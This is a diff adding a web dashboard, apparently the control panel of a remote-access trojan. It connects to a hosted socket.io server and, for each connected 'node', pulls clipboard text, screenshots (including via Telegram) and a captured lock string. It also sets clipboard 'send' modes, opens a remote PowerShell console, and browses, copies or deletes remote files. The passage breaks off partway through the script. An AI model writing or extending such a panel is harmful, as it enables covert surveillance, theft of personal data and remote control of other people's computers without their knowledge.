@@ -1,0 +1,858 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>Client Status Dashboard</title>
+  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+  <!-- Use official Tailwind CDN so utility classes work even when opening this file directly -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    .scroll-y {
+      overflow-y: auto;
+    }
+
+    .pointer {
+      cursor: pointer;
+    }
+
+    /* PowerShell-like console styling */
+    .ps-console {
+      background-color: #012456;
+      color: #e5e7eb;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+      font-size: 11px;
+      border-radius: 0.75rem;
+      box-shadow: 0 10px 25px rgba(15, 23, 42, 0.55);
+      border: 1px solid rgba(148, 163, 184, 0.5);
+    }
+
+    .ps-console-header {
+      padding: 0.35rem 0.75rem;
+      border-bottom: 1px solid rgba(148, 163, 184, 0.45);
+      background: linear-gradient(90deg, #0b2347, #0b3570);
+      font-size: 10px;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+      color: #cbd5f5;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .ps-console-body {
+      max-height: 190px;
+      min-height: 90px;
+      overflow-y: auto;
+      padding: 0.5rem 0.75rem;
+      white-space: pre-wrap;
+    }
+
+    .ps-line-timestamp {
+      color: #9ca3af;
+      font-size: 10px;
+      display: block;
+    }
+
+    .ps-line-output {
+      display: block;
+      margin-left: 0.25rem;
+    }
+
+    .ps-prompt {
+      color: #3ddcff;
+      font-weight: 600;
+      margin-right: 0.25rem;
+    }
+
+    .ps-input {
+      background: transparent;
+      border: none;
+      outline: none;
+      color: #e5e7eb;
+      flex: 1;
+    }
+
+    .ps-input::placeholder {
+      color: #6b7280;
+    }
+
+    /* Explorer styling */
+    .explorer-panel {
+      background: radial-gradient(circle at top left, #0f172a 0, #020617 55%);
+      color: #e5e7eb;
+      border-radius: 0.75rem;
+      border: 1px solid rgba(148, 163, 184, 0.4);
+      box-shadow: 0 16px 40px rgba(15, 23, 42, 0.8);
+      font-size: 11px;
+    }
+
+    .explorer-header {
+      padding: 0.35rem 0.75rem;
+      border-bottom: 1px solid rgba(30, 64, 175, 0.7);
+      background: linear-gradient(90deg, #020617, #0b1f4a);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 0.5rem;
+    }
+
+    .explorer-path-input {
+      background: rgba(15, 23, 42, 0.9);
+      border-radius: 0.375rem;
+      border: 1px solid rgba(55, 65, 81, 0.9);
+      padding: 0.1rem 0.4rem;
+      width: 100%;
+      outline: none;
+      color: #e5e7eb;
+    }
+
+    .explorer-path-input::placeholder {
+      color: #6b7280;
+    }
+
+    .explorer-list {
+      max-height: 180px;
+      min-height: 80px;
+      overflow-y: auto;
+    }
+
+    .explorer-row {
+      display: flex;
+      align-items: center;
+      padding: 0.25rem 0.75rem;
+      cursor: pointer;
+    }
+
+    .explorer-row:hover {
+      background: rgba(31, 41, 55, 0.95);
+    }
+
+    .explorer-col-name {
+      flex: 1 1 auto;
+      min-width: 0;
+    }
+
+    .explorer-col-size {
+      width: 70px;
+      text-align: right;
+      color: #9ca3af;
+    }
+
+    .explorer-col-date {
+      width: 125px;
+      text-align: right;
+      color: #9ca3af;
+    }
+
+    /* Large modes for console / explorer */
+    .ps-console.ps-large .ps-console-body {
+      max-height: 65vh;
+      min-height: 40vh;
+    }
+
+    .explorer-panel.ex-large .explorer-list {
+      max-height: 65vh;
+      min-height: 40vh;
+    }
+
+    .explorer-menu {
+      min-width: 140px;
+    }
+
+    .explorer-menu-item {
+      padding: 0.35rem 0.75rem;
+      cursor: pointer;
+    }
+
+    .explorer-menu-item:hover {
+      background-color: rgba(55, 65, 81, 0.95);
+    }
+  </style>
+</head>
+
+<body class="bg-gradient-to-b from-sky-50 to-white min-h-screen">
+  <div class="border-b bg-white/80 backdrop-blur sticky top-0 z-20 shadow-sm">
+    <div class="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between">
+      <div>
+        <h1 class="text-xl font-bold text-sky-900 tracking-tight">Node Clipboard Dashboard</h1>
+        <p class="text-xs text-slate-500">Monitor clipboard, screenshots and states for all connected nodes.</p>
+      </div>
+      <div class="flex items-center gap-3 text-xs">
+        <span id="connection-status"
+          class="inline-flex items-center gap-1 px-3 py-1 rounded-full bg-emerald-50 text-emerald-700 border border-emerald-200">
+          <span class="w-2 h-2 rounded-full bg-emerald-500"></span>
+          Connected
+        </span>
+        <button onclick="location.reload()"
+          class="px-3 py-1 rounded-lg bg-sky-50 hover:bg-sky-100 border border-sky-200 text-sky-700 font-semibold">Refresh</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="max-w-7xl mx-auto py-6 px-3">
+    <div class="mb-4 flex items-center justify-between text-xs text-slate-500">
+      <div>Tip: click a card to expand. Use the state selector to configure AutoSend / SpecialSend / NoSend per node.
+      </div>
+      <div id="node-counter"></div>
+    </div>
+    <!-- Scrollable card list so many nodes stay usable -->
+    <div class="overflow-y-auto pr-1 max-h-[calc(100vh-170px)]" id="clients-container">
+      <div id="clients" class="grid grid-cols-1 sm:grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-3 gap-5 pb-2">
+      </div>
+    </div>
+  </div>
+  <div id="explorerContextMenu"
+    class="hidden fixed z-50 bg-slate-900 text-slate-100 text-xs rounded shadow-lg border border-slate-700 explorer-menu">
+    <div class="explorer-menu-item" onclick="copyFromContext()">Copy to Local...</div>
+    <div class="explorer-menu-item text-rose-300" onclick="deleteFromContext()">Delete</div>
+  </div>
+
+  <!-- Screenshot lightbox (existing) -->
+  <div id="lightboxModal" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60">
+    <img id="lightboxImg"
+      class="max-w-[90vw] max-h-[90vh] border-8 border-sky-100 rounded shadow-2xl transition-transform duration-200">
+    <button onclick="closeLightbox()"
+      class="absolute top-10 right-10 bg-white rounded-full p-2 px-6 text-gray-800 text-3xl font-extrabold shadow-xl hover:bg-sky-100">&times;</button>
+  </div>
+
+  <!-- Console modal -->
+  <div id="consoleModal" class="hidden fixed inset-0 z-40 bg-black bg-opacity-60 flex items-center justify-center">
+    <div
+      class="bg-slate-900 rounded-2xl shadow-2xl w-[92vw] max-w-5xl max-h-[90vh] flex flex-col border border-slate-700 overflow-hidden">
+      <div class="px-4 py-2 border-b border-slate-700 flex items-center justify-between text-xs text-slate-200">
+        <div>
+          <div class="font-semibold" id="consoleModalTitle">Remote PowerShell</div>
+          <div class="text-[10px] text-slate-400" id="consoleModalSubtitle"></div>
+        </div>
+        <button onclick="closeConsoleModal()"
+          class="px-3 py-1 rounded-full bg-slate-800 hover:bg-slate-700 text-sm font-bold text-slate-100 border border-slate-600">&times;</button>
+      </div>
+      <div class="p-3 flex-1 flex flex-col">
+        <div class="ps-console ps-large w-full h-full flex flex-col">
+          <div class="ps-console-body scroll-y flex-1" id="consoleModalLog"></div>
+          <div class="mt-1 flex items-center px-3 pb-2 pt-1 text-[11px] border-t border-slate-700/60">
+            <span class="ps-prompt">PS &gt;</span>
+            <input id="consoleModalInput" type="text" placeholder="Enter PowerShell / cmd command, then press Enter"
+              class="ps-input" onkeydown="handleConsoleModalKey(event)">
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Explorer modal -->
+  <div id="explorerModal" class="hidden fixed inset-0 z-40 bg-black bg-opacity-60 flex items-center justify-center">
+    <div
+      class="bg-slate-950 rounded-2xl shadow-2xl w-[95vw] max-w-6xl max-h-[90vh] flex flex-col border border-slate-700 overflow-hidden">
+      <div class="px-4 py-2 border-b border-slate-700 flex items-center justify-between text-xs text-slate-200">
+        <div class="flex flex-col gap-0.5 flex-1 min-w-0 mr-3">
+          <div class="font-semibold" id="explorerModalTitle">Remote File Explorer</div>
+          <div class="text-[10px] text-slate-400 truncate" id="explorerModalSubtitle"></div>
+        </div>
+        <button onclick="closeExplorerModal()"
+          class="px-3 py-1 rounded-full bg-slate-800 hover:bg-slate-700 text-sm font-bold text-slate-100 border border-slate-600">&times;</button>
+      </div>
+      <div class="px-4 pt-3 pb-2 border-b border-slate-800 flex items-center gap-2 text-[11px] text-slate-100">
+        <span class="text-[10px] text-slate-400 whitespace-nowrap">Path</span>
+        <input id="modal-dir-path" class="explorer-path-input text-[11px]" type="text"
+          placeholder="e.g. C:\\Users\\yourname" onkeydown="handleExplorerModalPathKey(event)">
+        <div class="flex items-center gap-1">
+          <button class="px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-[10px]"
+            onclick="explorerModalUp()">Up</button>
+          <button class="px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-[10px]"
+            onclick="explorerModalRefresh()">Refresh</button>
+        </div>
+      </div>
+      <div class="flex-1 overflow-hidden">
+        <div class="explorer-panel ex-large h-full rounded-none border-0 border-t border-slate-800">
+          <div class="explorer-list text-[11px] h-full" id="modal-dir-list">
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script>
+    const SERVER_BASE = "https://my-server-ofbx.onrender.com";
+    const socket = io(SERVER_BASE, { query: { type: "dashboard" } });
+    let clientsInfo = {}; // nodeId: {user, name, address, socketId, state}
+    let clipboardLogs = {}; // nodeId: [ ... ]
+    let screenshots = {};   // nodeId: [ {ts, url}, ... ]
+    let shellLogs = {};         // nodeId: [ {output, timestamp}, ... ]
+    let directoryViews = {};    // nodeId: { path, parentPath, entries, error }
+    let expandState = {};       // nodeId: bool
+    let consoleOpenState = {};  // nodeId: bool
+    let explorerOpenState = {}; // nodeId: bool
+    let explorerContext = null; // { nodeId, path, isDir }
+    let consoleLargeState = {};   // nodeId: bool (used for in-card view)
+    let explorerLargeState = {};  // nodeId: bool (used for in-card view)
+    let activeConsoleNodeId = null;  // for console modal
+    let activeExplorerNodeId = null; // for explorer modal
+
+    socket.on("connect", () => {
+      const el = document.getElementById("connection-status");
+      if (el) {
+        el.className = "inline-flex items-center gap-1 px-3 py-1 rounded-full bg-emerald-50 text-emerald-700 border border-emerald-200";
+        el.innerHTML = '<span class=\"w-2 h-2 rounded-full bg-emerald-500\"></span>Connected';
+      }
+    });
+    socket.on("disconnect", () => {
+      const el = document.getElementById("connection-status");
+      if (el) {
+        el.className = "inline-flex items-center gap-1 px-3 py-1 rounded-full bg-rose-50 text-rose-700 border border-rose-200";
+        el.innerHTML = '<span class=\"w-2 h-2 rounded-full bg-rose-500\"></span>Disconnected';
+      }
+    });
+
+    socket.on("status_update", (clients) => { clientsInfo = clients || {}; updateUI(); });
+    socket.on("clipboard_result", ({ client, text }) => {
+      if (!clipboardLogs[client]) clipboardLogs[client] = [];
+      clipboardLogs[client].push({ text, timestamp: new Date().toLocaleString() });
+      clipboardLogs[client] = clipboardLogs[client].slice(-20);
+      updateSingleNode(client);
+      setTimeout(() => autoScrollLog(client), 80);
+    });
+    socket.on("screenshot", ({ client, img, ts }) => {
+      if (!client) return;
+      if (!screenshots[client]) screenshots[client] = [];
+      screenshots[client].push({ ts, url: img });
+      while (screenshots[client].length > 20) screenshots[client].shift();
+      updateSingleNode(client);
+    });
+    socket.on("shell_result", ({ client, output }) => {
+      if (!shellLogs[client]) shellLogs[client] = [];
+      shellLogs[client].push({ output, timestamp: new Date().toLocaleString() });
+      shellLogs[client] = shellLogs[client].slice(-20);
+      updateSingleNode(client);
+      setTimeout(() => autoScrollShellLog(client), 80);
+      if (activeConsoleNodeId === client) {
+        renderConsoleModal();
+      }
+    });
+    socket.on("directory_result", ({ client, path, parentPath, entries, error }) => {
+      directoryViews[client] = {
+        path: path || "",
+        parentPath: parentPath || "",
+        entries: entries || [],
+        error: error || null
+      };
+      updateSingleNode(client);
+      if (activeExplorerNodeId === client) {
+        renderExplorerModal();
+      }
+    });
+    function currentStateLabel(state) {
+      const v = (state || "autosend").toLowerCase();
+      if (v === "specialsend") return "SpecialSend";
+      if (v === "nosend") return "No Send";
+      return "AutoSend";
+    }
+    function currentStateColor(state) {
+      const v = (state || "autosend").toLowerCase();
+      if (v === "specialsend") return "bg-amber-50 text-amber-800 border-amber-200";
+      if (v === "nosend") return "bg-slate-100 text-slate-700 border-slate-200";
+      return "bg-emerald-50 text-emerald-800 border-emerald-200";
+    }
+    function lockStateLabel(locked) {
+      return locked ? "Locked" : "Unlocked";
+    }
+    function lockStateColor(locked) {
+      return locked ? "bg-slate-800 text-slate-50 border-slate-700" : "bg-emerald-50 text-emerald-800 border-emerald-200";
+    }
+    function buildImageUrl(url) {
+      if (!url) return "";
+      if (url.startsWith("http://") || url.startsWith("https://") || url.startsWith("data:")) return url;
+      return SERVER_BASE + url;
+    }
+
+    function renderClientCard(nodeId, node) {
+      const expanded = expandState[nodeId];
+      const curState = (node.state || "autosend").toLowerCase();
+      const isLocked = !!node.locked;
+      const consoleOpen = consoleOpenState[nodeId];
+      const explorerOpen = explorerOpenState[nodeId];
+      const consoleLarge = consoleLargeState[nodeId];
+      const explorerLarge = explorerLargeState[nodeId];
+      const dirView = directoryViews[nodeId] || { path: "", parentPath: "", entries: [], error: null };
+      const lastClipboard = (clipboardLogs[nodeId] && clipboardLogs[nodeId].length > 0)
+        ? clipboardLogs[nodeId][clipboardLogs[nodeId].length - 1].text
+        : "No clipboard yet.";
+      const lastShell = (shellLogs[nodeId] && shellLogs[nodeId].length > 0)
+        ? shellLogs[nodeId][shellLogs[nodeId].length - 1].output
+        : "No shell output yet.";
+      const lastLockTs = node.lastLockTs || null;
+      let lastLockText = "No lock info yet.";
+      if (lastLockTs) {
+        const when = formatDate(lastLockTs);
+        lastLockText = isLocked ? `Locked at ${when}` : `Unlocked at ${when}`;
+      }
+      const lockString = typeof node.lockString === "string" && node.lockString.length > 0
+        ? node.lockString
+        : "";
+
+      return `<div class='bg-white shadow-lg rounded-2xl hover:shadow-2xl border transition-all duration-200 ${expanded ? "border-sky-500 scale-[1.02]" : "border-slate-100"}'>
+   <div onclick='toggleExpand("${nodeId}")' class='flex items-center gap-3 px-4 py-3 cursor-pointer group border-b border-slate-100'>
+     <span class='text-4xl pointer-events-none select-none'>💻</span>
+     <div class='flex-1 min-w-0'>
+      <div class='flex items-center justify-between gap-2'>
+        <div class='font-semibold text-sm text-sky-900 truncate flex items-center gap-1.5'>
+          <span>${node.user || '?'}</span>
+        </div>
+        <div class='flex items-center gap-1'>
+          <span class='inline-flex items-center gap-1 text-[10px] font-medium px-1.5 py-0.5 rounded-full border ${lockStateColor(isLocked)}'>
+            <span class='w-1.5 h-1.5 rounded-full ${isLocked ? "bg-slate-100" : "bg-emerald-500"}'></span>
+            ${lockStateLabel(isLocked)}
+          </span>
+          <span class='inline-flex items-center gap-1 text-[10px] font-semibold px-2 py-0.5 rounded-full border ${currentStateColor(node.state)}'>
+          <span class='w-1.5 h-1.5 rounded-full ${curState === "nosend" ? "bg-slate-400" : (curState === "specialsend" ? "bg-amber-400" : "bg-emerald-500")}'></span>
+              ${currentStateLabel(node.state)}
+          </span>
+        </div>
+        </div>
+       <div class='text-[11px] text-slate-500 truncate'>${node.address || '?'}<span class='ml-1 text-slate-400'>/ ${nodeId.slice(0, 5)}...</span></div>
+       <div class='mt-1 text-[11px] text-slate-400 truncate'><span class='font-semibold text-slate-500'>Last Clip:</span> ${escapeHtml(lastClipboard)}</div>
+       <div class='mt-0.5 text-[11px] text-slate-400 truncate'><span class='font-semibold text-slate-500'>Last Shell:</span> ${escapeHtml(lastShell)}</div>
+       <div class='mt-0.5 text-[11px] text-slate-400 truncate'><span class='font-semibold text-slate-500'>Last Lock:</span> ${escapeHtml(lastLockText)}</div>
+       <div class='mt-0.5 text-[11px] text-slate-400 truncate'><span class='font-semibold text-slate-500'>Lock String:</span> ${lockString ? escapeHtml(lockString) : "<span class=\"text-slate-300 italic\">(none)</span>"}</div>
+     </div>
+     <div class='text-lg text-sky-200 group-hover:text-sky-400 select-none'>${expanded ? '▲' : '▼'}</div>
+   </div>
+   <div class='pl-4 pr-4 pb-3 pt-2 transition-all duration-300' style='display:${expanded ? "block" : "none"}'>
+    <div class='flex flex-wrap gap-2 my-3 items-center'>
+      <button class='px-3 py-1.5 text-[11px] rounded-lg bg-sky-100 text-sky-800 font-semibold hover:bg-sky-200 shadow-sm' onclick='event.stopPropagation(); socket.emit("get_clipboard", "${nodeId}")'>Get Clipboard</button>
+      <button class='px-3 py-1.5 text-[11px] rounded-lg bg-green-100 text-green-800 font-semibold hover:bg-green-200 shadow-sm' onclick='event.stopPropagation(); socket.emit("get_screenshots", "${nodeId}")'>Get Screenshots</button>
+      <button class='px-3 py-1.5 text-[11px] rounded-lg bg-emerald-100 text-emerald-800 font-semibold hover:bg-emerald-200 shadow-sm' onclick='event.stopPropagation(); socket.emit("get_screenshots_tg", "${nodeId}")'>Get Screenshots by TG</button>
+      <button class='px-3 py-1.5 text-[11px] rounded-lg bg-slate-800 text-slate-50 font-semibold hover:bg-slate-900 shadow-sm' onclick='event.stopPropagation(); toggleExplorer("${nodeId}")'>${explorerOpen ? "Hide Directory" : "Get Directory"}</button>
+      <button class='px-3 py-1.5 text-[11px] rounded-lg bg-slate-900/80 text-slate-50 font-semibold hover:bg-slate-800 shadow-sm' onclick='event.stopPropagation(); toggleConsole("${nodeId}")'>${consoleOpen ? "Hide Console" : "Get Console"}</button>
+      <select class='ml-auto rounded border-slate-200 text-[11px] px-2 py-1 shadow-sm bg-white' onchange='event.stopPropagation(); socket.emit("set_clipboard_state", {clientName: "${nodeId}", state: this.value})'>
+        <option value='autosend' ${curState === "autosend" ? "selected" : ""}>AutoSend</option>
+        <option value='specialsend' ${curState === "specialsend" ? "selected" : ""}>SpecialSend</option>
+        <option value='nosend' ${curState === "nosend" ? "selected" : ""}>No Send</option>
+      </select>
+    </div>
+    <div class='mt-1' style='display:${explorerOpen ? "block" : "none"}'>
+      <div class='explorer-panel ${explorerLarge ? "ex-large" : ""}'>
+        <div class='explorer-header'>
+          <div class='flex items-center gap-1.5 flex-1 min-w-0'>
+            <span class='text-[10px] text-slate-400 whitespace-nowrap'>Path</span>
+            <input id='dir-path-${nodeId}' class='explorer-path-input text-[11px]' type='text' placeholder='e.g. C:\\Users\\${node.user || ""}'
+              value='${escapeHtml(dirView.path || "")}' onkeydown='handleExplorerPathKey(event, "${nodeId}")'>
+          </div>
+          <div class='flex items-center gap-1'>
+            <button class='px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-[10px]' onclick='event.stopPropagation(); explorerUp("${nodeId}")'>Up</button>
+            <button class='px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-[10px]' onclick='event.stopPropagation(); refreshDirectory("${nodeId}")'>Refresh</button>
+            <button class='px-2 py-0.5 rounded bg-slate-700 hover:bg-slate-600 text-[10px]' onclick='event.stopPropagation(); openExplorerModal("${nodeId}")'>Window</button>
+          </div>
+        </div>
+        <div class='explorer-list text-[11px]' id='dir-list-${nodeId}'>
+          ${dirView.error ? `<div class='px-3 py-2 text-rose-300 text-[11px] border-b border-rose-500/40'>${escapeHtml(dirView.error)}</div>` : ""}
+          ${(dirView.entries || []).map(e => `
+            <div class='explorer-row' data-node='${nodeId}' data-path='${escapeHtml(e.fullPath || "")}' data-isdir='${e.isDir ? "1" : "0"}' onclick='handleExplorerEntry(event)' oncontextmenu='openExplorerMenu(event, "${nodeId}")'>
+              <div class='w-4 mr-2 text-sky-300 text-xs'>${e.isDir ? "📁" : "📄"}</div>
+              <div class='explorer-col-name truncate'>
+                <span class='${e.isDir ? "text-sky-100" : "text-slate-100"}'>${escapeHtml(e.name || "")}</span>
+              </div>
+              <div class='explorer-col-size'>
+                ${e.isDir ? "" : formatSize(e.size)}
+              </div>
+              <div class='explorer-col-date'>
+                ${e.modified ? formatDate(e.modified) : ""}
+              </div>
+            </div>
+          `).join('')}
+          ${(!dirView.entries || dirView.entries.length === 0) && !dirView.error ? `<div class='px-3 py-2 text-slate-400 text-[11px]'>Folder is empty.</div>` : ""}
+        </div>
+      </div>
+    </div>
+    <div class='mt-2' style='display:${consoleOpen ? "block" : "none"}'>
+      <div class='ps-console ${consoleLarge ? "ps-large" : ""}'>
+        <div class='ps-console-header'>
+          <span>Windows PowerShell (Remote)</span>
+          <div class='flex items-center gap-1'>
+            <span class='text-[9px] text-slate-300 mr-1'>${node.user || "User"}@${node.name || "PC"}</span>
+            <button class='px-2 py-0.5 rounded bg-sky-800/60 hover:bg-sky-700 text-[9px] text-sky-100 border border-sky-500/40'
+              onclick='event.stopPropagation(); openConsoleModal("${nodeId}")'>Window</button>
+          </div>
+        </div>
+        <div class='ps-console-body scroll-y' id='shell-log-${nodeId}'>
+          ${(shellLogs[nodeId] || []).map(e => `<div class='mb-1'><span class='ps-line-timestamp'>${e.timestamp}</span><span class='ps-line-output'>${escapeHtml(e.output)}</span></div>`).join('')}
+        </div>
+        <div class='mt-1 flex items-center px-3 pb-2 pt-1 text-[11px]'>
+          <span class='ps-prompt'>PS &gt;</span>
+          <input id='shell-cmd-${nodeId}' type='text' placeholder='Enter PowerShell / cmd command, then press Enter' class='ps-input' onkeydown='handleConsoleKey(event, "${nodeId}")'>
+        </div>
+      </div>
+    </div>
+    <div class='font-semibold text-slate-700 mb-1 mt-2 text-xs'>Clipboard Log</div>
+    <ul class='scroll-y max-h-40 min-h-16 pr-1 bg-sky-50 rounded-md mb-2 clipboard-log text-[11px]' id='clipboard-log-${nodeId}'>
+      ${(clipboardLogs[nodeId] || []).map(e => `<li class='mb-1'><span class='text-[0.8em] text-sky-500'>${e.timestamp}</span><span class='ml-2'>${escapeHtml(e.text)}</span></li>`).join('')}
+    </ul>
+    <div class='font-semibold text-slate-700 mb-1 mt-2 text-xs'>Screenshots</div>
+    <div class='grid grid-cols-4 sm:grid-cols-5 gap-1 mb-1 screenshots-thumb'>
+      ${(screenshots[nodeId] || []).map((e, i) => `<img src='${buildImageUrl(e.url)}' alt='S${i}' class='w-16 h-11 rounded object-cover border border-sky-200 shadow hover:scale-105 transition pointer bg-slate-100' onclick='event.stopPropagation();showLightbox("${buildImageUrl(e.url)}")'>`).join('')}
+    </div>
+   </div>
+ </div>`;
+    }
+    function updateUI() {
+      const container = document.getElementById("clients");
+      const counter = document.getElementById("node-counter");
+      container.innerHTML = '';
+      const ids = Object.keys(clientsInfo || {});
+      if (counter) {
+        counter.textContent = ids.length ? `${ids.length} node(s) online` : "No nodes online";
+      }
+      for (const nodeId of ids) {
+        const node = clientsInfo[nodeId];
+        if (!node) continue;
+        node.user = node.user || node.name || "?"; node.address = node.address || "?";
+        node.active = true;
+        container.innerHTML += renderClientCard(nodeId, node);
+        setTimeout(() => {
+          autoScrollLog(nodeId);      // ensure clipboard log always shows newest
+          autoScrollShellLog(nodeId); // ensure console log always shows newest
+        }, 30);
+      }
+    }
+    window.toggleExpand = function (id) { expandState[id] = !expandState[id]; updateUI(); }
+    window.toggleConsole = function (id) { consoleOpenState[id] = !consoleOpenState[id]; updateUI(); }
+    window.toggleExplorer = function (id) {
+      explorerOpenState[id] = !explorerOpenState[id];
+      if (explorerOpenState[id] && !directoryViews[id]) {
+        requestDirectory(id, "");
+      }
+      updateUI();
+    }
+    window.toggleConsoleSize = function (id) { consoleLargeState[id] = !consoleLargeState[id]; updateUI(); }
+    window.toggleExplorerSize = function (id) { explorerLargeState[id] = !explorerLargeState[id]; updateUI(); }
+    window.showLightbox = function (url) { document.getElementById('lightboxImg').src = url; document.getElementById('lightboxModal').classList.remove('hidden'); }
+    window.closeLightbox = function () { document.getElementById('lightboxModal').classList.add('hidden'); document.getElementById('lightboxImg').src = ''; }
+    function updateSingleNode(nodeId) { updateUI(); }
+    function escapeHtml(str) {
+      if (str === null || str === undefined) return "";
+      str = String(str);
+      return str.replace(/[<>&"']/g, function (c) {
+        return { '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', '\'': '&#039;' }[c];
+      });
+    }
+    function autoScrollLog(nodeId) {
+      const ul = document.getElementById(`clipboard-log-${nodeId}`);
+      if (ul) ul.scrollTop = ul.scrollHeight;
+    }
+    function autoScrollShellLog(nodeId) {
+      const ul = document.getElementById(`shell-log-${nodeId}`);
+      if (ul) ul.scrollTop = ul.scrollHeight;
+    }
+    window.handleConsoleKey = function (e, nodeId) {
+      if (e.key === "Enter") {
+        e.preventDefault();
+        runShell(nodeId);
+      }
+    }
+    window.runShell = function (nodeId) {
+      const input = document.getElementById(`shell-cmd-${nodeId}`);
+      if (!input) return;
+      const cmd = input.value.trim();
+      if (!cmd) return;
+      socket.emit("run_shell_command", { nodeId, command: cmd });
+      input.value = "";
+    }
+
+    function requestDirectory(nodeId, path) {
+      socket.emit("get_directory", { nodeId, path: path || "" });
+    }
+
+    window.refreshDirectory = function (nodeId) {
+      const view = directoryViews[nodeId];
+      requestDirectory(nodeId, view && view.path ? view.path : "");
+    }
+
+    window.explorerUp = function (nodeId) {
+      const view = directoryViews[nodeId];
+      if (!view) {
+        requestDirectory(nodeId, "");
+        return;
+      }
+      const target = view.parentPath || view.path || "";
+      requestDirectory(nodeId, target);
+    }
+
+    window.handleExplorerPathKey = function (e, nodeId) {
+      if (e.key === "Enter") {
+        e.preventDefault();
+        const input = document.getElementById(`dir-path-${nodeId}`);
+        if (!input) return;
+        const p = input.value.trim();
+        requestDirectory(nodeId, p);
+      }
+    }
+
+    window.handleExplorerEntry = function (e) {
+      const row = e.currentTarget;
+      const nodeId = row.getAttribute("data-node");
+      const path = row.getAttribute("data-path");
+      const isDir = row.getAttribute("data-isdir") === "1";
+      if (!nodeId || !path) return;
+      if (isDir) {
+        requestDirectory(nodeId, path);
+      } else {
+        // For now, just navigate to containing folder
+        requestDirectory(nodeId, path);
+      }
+    }
+
+    function formatSize(bytes) {
+      if (bytes === null || bytes === undefined) return "";
+      const n = Number(bytes);
+      if (!isFinite(n) || n <= 0) return "";
+      if (n < 1024) return n + " B";
+      const kb = n / 1024;
+      if (kb < 1024) return kb.toFixed(1) + " KB";
+      const mb = kb / 1024;
+      if (mb < 1024) return mb.toFixed(1) + " MB";
+      const gb = mb / 1024;
+      return gb.toFixed(1) + " GB";
+    }
+
+    function formatDate(d) {
+      try {
+        const dt = new Date(d);
+        if (isNaN(dt.getTime())) return "";
+        return dt.toLocaleString();
+      } catch {
+        return "";
+      }
+    }
+
+    function renderConsoleModal() {
+      if (!activeConsoleNodeId) return;
+      const nodeId = activeConsoleNodeId;
+      const modal = document.getElementById("consoleModal");
+      const titleEl = document.getElementById("consoleModalTitle");
+      const subEl = document.getElementById("consoleModalSubtitle");
+      const logEl = document.getElementById("consoleModalLog");
+      if (!modal || !titleEl || !subEl || !logEl) return;
+
+      const node = clientsInfo[nodeId] || {};
+      titleEl.textContent = "Remote PowerShell";
+      subEl.textContent = `${node.user || "User"}@${node.name || "PC"}  —  ${node.address || "?"}  (${nodeId})`;
+
+      const logs = shellLogs[nodeId] || [];
+      logEl.innerHTML = logs.map(e =>
+        `<div class='mb-1'><span class='ps-line-timestamp'>${e.timestamp}</span><span class='ps-line-output'>${escapeHtml(e.output)}</span></div>`
+      ).join("");
+      logEl.scrollTop = logEl.scrollHeight;
+    }
+
+    window.openConsoleModal = function (nodeId) {
+      activeConsoleNodeId = nodeId;
+      renderConsoleModal();
+      const modal = document.getElementById("consoleModal");
+      if (modal) modal.classList.remove("hidden");
+      const input = document.getElementById("consoleModalInput");
+      if (input) setTimeout(() => input.focus(), 50);
+    }
+
+    window.closeConsoleModal = function () {
+      const modal = document.getElementById("consoleModal");
+      if (modal) modal.classList.add("hidden");
+      activeConsoleNodeId = null;
+    }
+
+    window.handleConsoleModalKey = function (e) {
+      if (e.key === "Enter") {
+        e.preventDefault();
+        if (!activeConsoleNodeId) return;
+        const input = document.getElementById("consoleModalInput");
+        if (!input) return;
+        const cmd = input.value.trim();
+        if (!cmd) return;
+        socket.emit("run_shell_command", { nodeId: activeConsoleNodeId, command: cmd });
+        input.value = "";
+      }
+    }
+
+    function renderExplorerModal() {
+      if (!activeExplorerNodeId) return;
+      const nodeId = activeExplorerNodeId;
+      const modal = document.getElementById("explorerModal");
+      const titleEl = document.getElementById("explorerModalTitle");
+      const subEl = document.getElementById("explorerModalSubtitle");
+      const pathInput = document.getElementById("modal-dir-path");
+      const listEl = document.getElementById("modal-dir-list");
+      if (!modal || !titleEl || !subEl || !pathInput || !listEl) return;
+
+      const node = clientsInfo[nodeId] || {};
+      const view = directoryViews[nodeId] || { path: "", parentPath: "", entries: [], error: null };
+
+      titleEl.textContent = "Remote File Explorer";
+      subEl.textContent = `${node.user || "User"}@${node.name || "PC"}  —  ${node.address || "?"}  (${nodeId})`;
+      pathInput.value = view.path || "";
+
+      let html = "";
+      if (view.error) {
+        html += `<div class='px-3 py-2 text-rose-300 text-[11px] border-b border-rose-500/40'>${escapeHtml(view.error)}</div>`;
+      }
+      const entries = view.entries || [];
+      html += entries.map(e => `
+        <div class='explorer-row' data-node='${nodeId}' data-path='${escapeHtml(e.fullPath || "")}' data-isdir='${e.isDir ? "1" : "0"}'
+             onclick='handleExplorerEntry(event)'
+             oncontextmenu='openExplorerMenu(event, "${nodeId}")'>
+          <div class='w-4 mr-2 text-sky-300 text-xs'>${e.isDir ? "📁" : "📄"}</div>
+          <div class='explorer-col-name truncate'>
+            <span class='${e.isDir ? "text-sky-100" : "text-slate-100"}'>${escapeHtml(e.name || "")}</span>
+          </div>
+          <div class='explorer-col-size'>
+            ${e.isDir ? "" : formatSize(e.size)}
+          </div>
+          <div class='explorer-col-date'>
+            ${e.modified ? formatDate(e.modified) : ""}
+          </div>
+        </div>
+      `).join("");
+      if (entries.length === 0 && !view.error) {
+        html += `<div class='px-3 py-2 text-slate-400 text-[11px]'>Folder is empty.</div>`;
+      }
